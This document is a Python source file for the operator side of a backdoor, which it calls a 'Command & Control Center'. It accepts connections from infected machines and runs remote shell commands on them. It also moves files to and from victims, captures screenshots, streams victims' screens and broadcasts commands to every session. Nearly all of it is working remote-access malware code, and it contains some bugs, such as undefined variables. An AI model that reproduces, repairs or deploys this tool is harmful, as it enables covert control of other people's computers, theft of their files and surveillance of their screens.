# WARNING: If the server does not start and retrieves the OSError 98 
# of "Address already in use", use the "ps -fA | grep python" command
# to check the PID of the service and kill it with the "kill -9 (PID)"
# command; (replace (PID) by the actual PID)

import socket
import termcolor
import json
import help
import os
from vidstream import StreamingServer
import threading
import sys

# Connection data
HOST = '192.168.1.110'
PORT = 5555
STREAM_PORT = 9999
streamFlag = 0

def send(target, data):
    jsonData = json.dumps(data)
    target.send(jsonData.encode())

# In order not to overflow the default socket.recv() function
# the function recv() reads the data in chunks of 1024 bytes
# at a time and appends it to the data variable.
def recv(target):
    data = ''

    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

# Upload file to the target's file system
def uploadFile(target, fileName):
    f = open(fileName, 'rb') # Open the file on 'read bytes' mode
    target.send(f.read())

#  Downloads the specified file from the targets file system
def  downloadFile(target, fileName): 
    f = open(fileName, 'wb') # Open the file in reading bytes mode
    target.settimeout(1)
    chunk = target.recv(1024)

    while chunk:
        f.write(chunk)

        try:
            chunk = target.recv(1024)

        except socket.timeout as e:
            break

    target.settimeout(None)
    f.close()

# Receive the screenshot from the target
def screenshotRecv(target, count): 
    f = open('screenshot%d.png' % (count), 'wb')
    target.settimeout(3)
    chunk = target.recv(1024)

    while chunk:
        f.write(chunk)

        try:
            chunk = target.recv(1024)

        except socket.timeout as e:
            break

    target.settimeout(None)
    f.close()

# Start screensharing
def streamServerStart():

    try:
        server = StreamingServer(HOST, STREAM_PORT)

        t = threading.Thread(target=server.start_server())
        t.start()

        cmd = input("[-] Type 'stream-stop' to end the stream:")

        while cmd != 'stream-stop':
            continue

        send(target, cmd)
        server.stop_server()
    
    except:
        pass

# Sends and receives data to and from the backdoor
def targetComs(target, ip):
    count = 0
    
    global streamFlag

    while True:

        prompt = input("Shell [%s]:" % str(ip))
        send(target, prompt)

        if prompt == 'exit': # Exit the loop if the exit message is sent
            break

        elif command == 'background':
            break

        elif prompt == 'clear': # Clear the screen
            os.system('clear')
        
        elif prompt.startswith('cd '): # (Change directory implementation on the client-side)
            pass

        elif prompt.startswith('upload'): # Upload a file to  the target's file system
            uploadFile(target, prompt[7:])

        elif prompt.startswith('download'): # Download a file from the target's file system
            downloadFile(target, prompt[9:])

        elif prompt.startswith('screenshot'):
            screenshotRecv(target, count)
            count += 1

        elif prompt.startswith('stream-start'):
            streamServerStart()

        elif prompt == 'help': # List all the available commands to the user
            print(termcolor.colored(help.HELP, 'green'))

        else:
            response = recv(target)
            print(response)

# Accept connections
def acceptConnections():
    while True:

        if stopFlag:
            t1.join()
            break
        
        #sock.timeout(1)

        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print('\n')
            print(termcolor.colored(f'[+] {str(ip)} joined the network!', 'green'))
        
        except:
            pass

targets = []
ips = []
stopFlag = False

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))

print(termcolor.colored(f'[+] Server listening on port [{PORT}] for incoming connections', 'green'))

sock.listen()

t1 = threading.Thread(target=acceptConnections)
t1.daemon=True
t1.start()

print(termcolor.colored('[+] Waiting for incoming connections...'))

while True:

    command = input('[+] Command & Control Center: ')

    if command == 'list-targets': # Print all the current targets connected to the network

        print('\n')

        counter = 0

        for ip in ips:
            print(f'--> Session {str(counter)} | {str(ip)}')
            counter += 1

    elif command == 'clear':
        os.system('clear')

    elif command.startswith('using'): # Selects the session to use
        
        try:
            num = int(command[6:])
            Target = targets[num]
            TargetIP = ips[num]
            targetComs(Target, TargetIP)

        except:
            print(termcolor.colored(f'[-] No such session id ({str(num)})', 'red'))

    elif command == 'shutdown': # Exits the command & controll center and shuts down every backdoor instance
        
        print(termcolor.colored('[WARN] The shutdown command will end every backdoor session remotly', 'yellow'))
    
        continue_ = input('[!] Are you sure you want to procede? (y/n):')

        if continue_ == 'y':

            for target in targets:
                send(target, 'exit')
                target.close()

            print(termcolor.colored(f'[+] All {str(len(targets))} have been successfuly shutdown...', 'green'))
            print(termcolor.colored(f'[+] Exiting Command & Controll Center...', 'yellow'))

            sock.close()
            stopFlag = True

            print(termcolor.colored(f'[+] Socket closed. Exiting...', 'yellow'))
            break

    elif command.startswith('kill'): # Kill a specified session
        
        Target = targets[int(command[5:])]
        ip = ips[int(command[5:])]

        send(Target, 'exit')
        Target.close()
        
        targets.remove(Target)
        ips.remove(ip)
    
    elif command.startswith('terminate-all'): # Turn-off every target pc connected to the network
        print(f'[+] Turning off {str(len(targets))} machines')

    elif command.startswith('quit'): # Exits the command and control center without ending the target's sessions
        break

    elif command == '':
        pass

    elif command.startswith('broadcast'): # Sends the specified command to all targets in the network
        x = len(targets)
        print(f'[+] Broadcasting command to {str(x)} machines')
        i = 0

        try:
            while i < x:
                Target = targets[i]
                send(Target, command) # The backdoor will handle the rest of the command
                print(f'[*] Command sent to {str(Target)}')
                i += 1

        except:
            print(termcolor.colored('[Error] Unable to broadcast command', 'red'))
    
    else:
        print(termcolor.colored(f"[!!!] Unable to find command '{str(command)}'", 'red'))

#t1.join()